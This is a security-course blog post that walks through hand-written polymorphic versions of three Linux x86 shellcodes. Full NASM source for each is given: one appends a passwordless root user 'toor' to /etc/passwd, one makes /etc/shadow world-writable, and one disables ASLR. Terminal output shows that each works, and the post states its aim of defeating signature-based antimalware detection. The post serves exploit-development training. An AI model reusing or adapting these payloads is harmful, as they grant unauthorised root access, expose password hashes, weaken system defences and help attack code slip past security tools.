---
layout: post
title: Polymorphic Shellcode Payloads
---

*This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:*

*http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/*

*Student ID: SLAE - 1187*

Introduction
============

This post will discuss some techniques for creating polymorphic versions of some shellcode payloads from shell-storm.org. Polymorphic code, not to be confused with polymorphism (a concept in computer science) is code that is semantically the same as other code but is structured differently and uses different instructions. In most scenarios of polymorphic code a polymorphic engine automatically transforms and produces this code. Here, however, we'll be applying these techniques by hand. The goal of polymorphic code from a shellcoding point of view is to defeat automatic recognition of malicious code through simple means such as pattern matching.

We'll be modifying three shellcodes selected from [shell-storm.org](shell-storm.org). 

* [append /etc/passwd & exit() - 107 bytes by $andman](http://shell-storm.org/shellcode/files/shellcode-561.php)
* [chmod(/etc/shadow, 0777) - 29 bytes by Magnefikko](http://shell-storm.org/shellcode/files/shellcode-593.php)
* [ASLR deactivation - 83 bytes by Jean Pascal Pereira](http://shell-storm.org/shellcode/files/shellcode-813.php)

Our goal is to munge these payloads and still keep them within 150% of their size in bytes. I.e. we'll have 159 bytes to work with when modifying $andman's 'append /etc/passwd & exit()' shellcode.

All of these shellcodes have their payloads simply embedded in a C file as a hex escaped string. We'll take this and pipe it into `ndisasm` as I did in my shellcode analysis article. This will give us the instructions to base our version off of. 
 
## Modified 'append /etc/passwd & exit()' Shellcode

This shellcode by $andman, the original of which can be found [here](http://shell-storm.org/shellcode/files/shellcode-561.php) is relatively straightforward. It uses the JMP CALL POP method to get a reference to a string located at the end of the payload. It then modifies the string to write some null terminators where individual strings end and should be separated. It then opens the file referenced in the first part of the string (`/etc/passwd`), and appends the string `toor::0:0:t00r:/root:/bin/bash\n` to the file. 

My modified version shown below can also be found on github [here.](https://github.com/fbcsec/slae-assignments/blob/master/6-shellcode-polymorph/append_passwd_modified.asm) It is 104 bytes long.

```nasm
; Modified 'append /etc/passwd & exit()' by fbcsec. Original by $andman
; The user t00r with uid 0 and an empty password is appended to the end of /etc/passwd.
; Original: http://shell-storm.org/shellcode/files/shellcode-561.php

global _start

section .text

_start:

xor ecx, ecx
mul ecx                 ; zero EAX, ECX, and EDX
add eax, 0x05           ; set EAX to the syscall ID for open(2)
push 0x23206873         ; begin PUSHing the string '/etc/passwd#toor::0:0:t00r:/root:/bin/bash #'
mov [esp+3], byte ah    ; Replace the last '#' with \x00
mov [esp+2], byte 0x0a  ; Replace the ' ' at the end of the string to write with a newline character
push 0x61622f6e
push 0x69622f3a
push 0x746f6f72
push 0x2f3a7230
push 0x30743a30
push 0x3a303a3a
push 0x726f6f74
mov edi, esp            ; save pointer to 'toor::0[...] in EDI.
push 0x23647773
mov [esp+3], byte ah    ; Replace the first '#' with \x00
push 0x7361702f
push 0x6374652f         ; string is now carved out
mov ebx, esp            ; save pointer to entire string to ebx

add cx, 0x0442
int 0x80                ; execute open(2)


push eax                ; push the file handle returned by open(2)
pop ebx                 ; pop it into EBX
mov ecx, edi            ; Move into ECX the pointer to 'toor::0[...]' saved in edi.
add dl, 0x1f            ; EDX should be zero, so move the length of the string we're writing into dl.
mov al, 0x04
int 0x80                ; make write(2) syscall


mov al, 0x06
int 0x80                ; make a close(2) syscall using the file descriptor still in EBX

inc eax
int 0x80                ; make an exit(2) syscall to gracefully exit

```

To briefly discuss the changes made, I move from using JMP CALL POP to get a reference to data to pushing it to the stack directly. This hurts pattern matching on the string as it is now broken up by the opcode for PUSH every four bytes and the values pushed are reversed. In addition, immediately as values I want to modify are pushed we make the changes, further breaking up the large swath of PUSH instructions. 

I also replace some MOVs with PUSH POPS and ADDs. and remove unneeded MOVs to DX before a call to `open(2)` and some other unneeded instructions. You can see a techniques for obfuscating values in the bytecode where I 'encode' the value and move the encoded value into the register, then modify the register with a SUB, ADD, AND, XOR, etc. so that the bytecode doesn't include the real value being used. 

My version is 104 bytes, three bytes smaller than the original. 

```
root@mountain:~# tail -n 2 /etc/passwd
beef-xss:x:133:141::/var/lib/beef-xss:/usr/sbin/nologin
redis:x:134:143::/var/lib/redis:/usr/sbin/nologin
root@mountain:~# ./append_passwd_modified.elf 
Shellcode length: 104
root@mountain:~# tail -n 2 /etc/passwd
redis:x:134:143::/var/lib/redis:/usr/sbin/nologin
toor::0:0:t00r:/root:/bin/bash
```

## Modified chmod(/etc/shadow, 0777) Shellcode

This shellcode is small and simple. At 29 bytes I only have 43 bytes of room to fit my polymorphic version. The original shellcode written by Magnefikko can be found here. [here.](http://shell-storm.org/shellcode/files/shellcode-593.php)

This shellcode makes one syscall, a `chmod(2)` syscall that changes the permission of `/etc/shadow` to read, write, and execute for all users on the system. The shadow file is the location on modern Unix and Linux systems that contains user passwords. This can let a user read password hashes and arbitrarily change passwords on the system. The shellcode does this by simply pushing `//etc/shadow` to the stack, moving the hexademial of the octal value `777` to ECX, and firing the syscall. 

My modified version shown below can also be found on github [here.](https://github.com/fbcsec/slae-assignments/blob/master/6-shellcode-polymorph/chmod_shadow_modified.asm) It is 40 bytes long.

```nasm
; Modified 29 bytes chmod("/etc/shadow", 0777) shellcode by fbcsec
; Original by Magnefikko
; Original: http://shell-storm.org/shellcode/files/shellcode-593.php

global _start

section .text

_start:

push 0x0f
pop eax
cdq
push edx

mov edx, 0x665e5350
add edx, 0x11111111
push edx
mov cx, 0xfee8
push 0x68732f63

not ch
add cl, 0x17
push 0x74652f2f

push esp
pop ebx

add dl, 0xee

int 0x80

```

My modifications are similar to the last shellcode. I split up the PUSHes that get the `/etc/shadow` string to the stack. I insert other operations that need to get done between them. For instance, I've also split up and obfuscated the move of `0x1FF` (octal `777`) to ECX by moving the value encoded into the register, and then splitting up the operations needed to decode it. The instructions that do this are interleaved into the PUSH instructions. To decode CX in this case, I NOT the high bytes and ADD to the low bytes `0x17`. I also seriously change how the syscall ID is set. I use the PUSH POP method to get it into EAX, then CDQ, which writes the 31st bit into all bits of EDX, thus zeroing it in this case. I then PUSH the nulled EDX to terminate the string that is pushed throughout the shellcode. I also encode the `adow` portion of the string with what free bytes I have left. 

```
root@mountain:~# ls -als /etc/shadow
4 -rw------- 1 root shadow 1600 Jun  8 16:50 /etc/shadow
root@mountain:~# ./chmod_shadow_modified.elf
Shellcode length: 40
Segmentation fault
root@mountain:~# ls -als /etc/shadow
4 -rwxrwxrwx 1 root shadow 1600 Jun  8 16:50 /etc/shadow
```

 ## Modified ASLR Deactivation Shellcode

This shellcode is another open, write, and exit shellcode but with a much longer and more inexcusable string. It writes a zero into `/proc/sys/kernel/randomize_va_space`, a file which I can think of few legitimate reasons for a process to access. This disables address space layout randomization, a key security feature that increases the difficulty of exploiting stack based buffer overflows. With ASLR disabled, discrete units of code are consistently loaded into the same memory addresses between program runs, and even between individual systems. The original shellcode written by Jean Pascal Pereira can be found [here](http://shell-storm.org/shellcode/files/shellcode-813.php). 

This shellcode is another `open(2)`, `write(2)`, `close(2)` shellcode similar to the first one we discussed. It has two key differentiating features. First the string being used for the target file name is large and extremely suspicious. As I mentioned above, legitimate processes generally aren't going to be touching this file. It also lets me take a step aside to discuss at one of the most interesting aspects of Unix like operating systems, `procfs`.

### `/proc/` and How This Even Works

If you're at all familiar with Unix and its clones (i.e. Linux), you may be familiar with the idea that *everything* is a file. There is a root filesystem from which all objects related to the system can be found hierarchically, starting from `/`. This is in contrast to how Windows handles things. In Windows, each disk is the root of its own filesystem and files are exclusive to the disk they reside on. In Unix like systems when I plug in a flash drive it will appear under the `/dev/` directory as a file, probably something like `/dev/sdc`. Its partitions will appear in `/dev/`, maybe if I've only got one I'll just see `/dev/sdc1`. When I mount this drive so I can access its contents I have to pick another point, usually under `/mnt/` or `/media/` to mount it in. From its mount point I could directly access its files or I could read off raw bytes from from its file in `/dev/`. 

Devices aren't just what is exposed in the filesystem. Through a special filesystem called `procfs` information about the running state of processes, including the kernel, is exposed and can be modified. For instance, I can browse to `/proc/<pid>/fd/` and I can take a look at all the file descriptors opened to that process and read or write bytes to them if I wanted to. I shouldn't have to say that this is extremely powerful. As I said, one could modify properties of running processes, and even the kernel. In `/proc/sys/kernel` we can mess around with flags that affect the running state of the kernel. For example, if we write a '1' into `/proc/sys/kernel/panic` we could cause a kernel panic and halt some systems. 

In this case, `/proc/sys/kernel/randomize_va_space` holds a flag that controls ASLR. This shellcode writes a zero into this file, disabling it. 

My modified version shown below can also be found on github [here.](https://github.com/fbcsec/slae-assignments/blob/master/6-shellcode-polymorph/disable_aslr_modified.asm) It is 112 bytes.

```nasm
; Modified ASLR deactivation shellcode by fbcsec
; Original by Jean Pascal Pereira
; Original: http://shell-storm.org/shellcode/files/shellcode-813.php

global _start

section .text

_start:

jmp callsc

sc:
pop esi                     ; pop pointer to encoded string
mov ebx, esi                ; copy pointer to ebx
xor ecx, ecx                ; empty eax, ecx, and edx
mul ecx

decodestr:                  ; simple xor decoder stub for encoded '/proc/sys/kernel/randomize_va_space' string.
xor byte [esi], 0x41
jz short decoded
inc esi
jmp decodestr

decoded:
mov [esi], byte al          ; null terminate decoded string

mov cl, 0x08
yet_another_loop:           ; Get 0x08 into EAX
inc eax
loop yet_another_loop

push word 0x1ab             ; push/pop encoded flags
pop ecx
add cx, 0x111               ; decode flags
int 0x80                    ; make open(2) syscall


push eax
pop ebx
push eax                    ; push the file descriptor (which when pushed in this way null terminates whatever is pushed to the stack afterwards)
mov dx,0x9f87               ; push the characters '0:', xor encoded and backwards
xor dx, 0xa5b7              ; decode '0:' characters
push dx                     ; push these to the stack
push esp                    ; save pointer to this data
pop ecx
xor esi, esi
mov esi, edx
inc edx                     ; write only one byte of the saved data
mov al,0x4
int 0x80                    ; make write(2) syscall

push byte 0x06
pop eax
int 0x80

mov al, 0x01
int 0x80                    ; make exit(2) syscall

callsc:
call sc
encoded_bytes: db 0x6e, 0x6e, 0x31, 0x33, 0x2e, 0x22, 0x6e, 0x32, 0x38, 0x32, 0x6e, 0x2a, 0x24, 0x33, 0x2f, 0x24, 0x2d, 0x6e, 0x33, 0x20, 0x2f, 0x25, 0x2e, 0x2c, 0x28, 0x3b, 0x24, 0x1e, 0x37, 0x20, 0x1e, 0x32, 0x31, 0x20, 0x22, 0x24, 0x41

```

We'll want to get rid of the raw `/proc/sys/kernel/randomize_va_space` string as soon as possible. I keep mentioning it, but it really is a huge string of dead giveaway. I do this by encoding the string, moving it into a JMP CALL POP, and including a small decoder stub. The encoding is a simple one byte XOR on each byte of the string with a `\x41`. I also abuse loops and push pops to disguise setting syscall IDs. The opener is much more verbose as well, nulling three registers for good measure and saving two pointers. I also use typical encoding techniques for moving specific values such as flags for `open(2)` and the setup of the `0:<file_descriptor>/x00` strings. I try to make semantic changes when possible. The point being to defeat pattern matching for specific shellcode payloads, we want th leave 'no stone unturned', or I suppose, no byte unchanged if possible.

## Conclusions

You might notice that these shellcodes look kind of like a mess. Fortunately, that's sort of the point. The shorter common strings of bytes are between our polymorphized shellcodes and the originals, the less opportunities that a signature for one will find the other. The vast majority of antimalware engines are signature based. They can only find what they already know about, and by doing this we do serious harm to their ability to detect us.   

  
